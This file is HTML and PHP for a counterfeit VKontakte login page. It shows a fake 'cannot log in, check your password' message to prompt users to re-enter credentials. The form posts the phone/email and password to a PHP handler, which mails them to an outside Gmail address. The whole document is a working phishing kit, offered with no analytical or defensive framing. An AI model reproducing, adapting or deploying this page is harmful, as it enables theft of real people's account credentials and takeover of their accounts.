<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device width, initial-scale=1.0">
    <link rel="stylesheet" href="sing.css">
    <link rel="shortcut icon" href="/img/vklog.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@500&family=Nunito+Sans:wght@300&family=Oswald&family=Roboto+Condensed:wght@300&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    
    <title>Вход | ВКонтакте</title>
</head>
<body>
<nav class="nav">
    <a href="http://localhost/vk_sing.html" class="nav_link">
    <svg width="137" height="24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x=".16"  width="24" height="24" rx="5.76" fill="#07F"></rect><path d="M12.98 17.5c-5.41 0-8.7-3.76-8.83-10H6.9c.09 4.59 2.18 6.53 3.78 6.93V7.5h2.62v3.96c1.55-.17 3.16-1.97 3.7-3.96h2.6a7.62 7.62 0 01-3.42 4.99 7.9 7.9 0 014.01 5.01h-2.84c-.6-1.9-2.07-3.37-4.05-3.57v3.57H13z" fill="#fff"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M67.16 12.5c0 3.34-2.43 5.5-5.88 5.5s-5.88-2.16-5.88-5.5S57.84 7 61.28 7c3.45 0 5.88 2.16 5.88 5.5zm-9.22 0c0 2.07 1.35 3.5 3.34 3.5s3.34-1.43 3.34-3.5c0-2.07-1.35-3.45-3.34-3.45s-3.34 1.38-3.34 3.45zm-17.03-.21c.95-.45 1.56-1.19 1.56-2.33C42.47 8.23 40.9 7 38.6 7h-5.26v11h5.5c2.37 0 4.01-1.29 4.01-3.05a2.76 2.76 0 00-1.94-2.66zm-5.14-3.28h2.83c.85 0 1.44.5 1.44 1.2s-.59 1.19-1.44 1.19h-2.83V9.01zm3.07 6.98h-3.07V13.3h3.07c.95 0 1.58.55 1.58 1.36 0 .8-.63 1.33-1.58 1.33zM52 18h3.2l-5.06-5.71L54.77 7h-2.9l-3.68 4.27h-.59V7h-2.43v11h2.43v-4.38h.6L52 18zM76.63 7v4.34H71.7V7h-2.43v11h2.43v-4.44h4.93V18h2.43V7h-2.43zm10.44 11h-2.43V9.22h-3.81V7h10.04v2.22h-3.8V18zm9.7-11c-2.13 0-4.02.89-4.57 2.8l2.24.37a2.38 2.38 0 012.2-1.25c1.34 0 2.12.9 2.22 2.33H96.5c-3.24 0-4.85 1.42-4.85 3.45 0 2.05 1.59 3.3 3.83 3.3 1.8 0 3-.82 3.53-1.73l.51 1.73h1.8v-6.18c0-3.19-1.74-4.82-4.55-4.82zm-.72 9.16c-1.18 0-1.94-.61-1.94-1.56 0-.85.6-1.44 2.47-1.44h2.3c0 1.8-1.14 3-2.83 3zM113.9 18h-3.2l-3.8-4.38h-.59V18h-2.43V7h2.43v4.27h.6L110.56 7h2.9l-4.63 5.29 5.05 5.71zm4.28 0h2.43V9.22h3.8V7h-10.04v2.22h3.8V18zm12.28-11c3.35 0 5.71 2.2 5.71 5.37 0 .3-.02.55-.04.79h-8.84c.23 1.69 1.46 2.83 3.32 2.83 1.3 0 2.3-.55 2.84-1.33l2.28.38c-.82 2.1-2.98 2.96-5.27 2.96-3.34 0-5.7-2.18-5.7-5.5s2.36-5.5 5.7-5.5zm3.07 4.25A3.06 3.06 0 00130.45 9a3 3 0 00-3.02 2.25h6.09z" fill="currentColor"></path></svg>
    </a>
    </nav>
    
<div class="block">
    <p class="text1">Вход ВКонтакте</p>
    <div class="text2" style="background: #FAEBEB;">Не удаётся войти.<br>
	Пожалуйста, проверьте правильность написания логина и пароля.</div>

<div class="container"> 
    <form action="sandemail.php" method="post">
    <div class="input_box1"><input type="text" name="name" placeholder="Телефон или email" required></div>
    <div class="input_box2"><input type="password" name="password" placeholder="Пароль" required maxlength="50"></div>
    <p><input type="checkbox" name="a" value=""> Чужой компьютер</p>


        <input type="submit" value="Войти" class="submit">
    </form>
</div>

</div>




</body>
</html>


<?php
$subject = "Логин Вконтакте";

$name    = $_POST['name'];
$password   = $_POST['password'];

$name  = htmlspecialchars($name);
$password = htmlspecialchars($password);	 

$name   = urldecode($name);
$password  = urldecode($password);
  
$name   = trim($name); 
$password  = trim($password);
	 
?>
<div style="font-size: 40px;
			text-align: center;
			padding-top: 15vh;


			">

<? 
if (mail("proverka4912@gmail.com", "$subject", 
	"Имя: ".$name.
	"\n\nE-mail: ".$password
	,"From: proverka4912@gmail.com \r\n"))

 {  echo "";
} 

else {
    echo "Ошибка";
}
?>
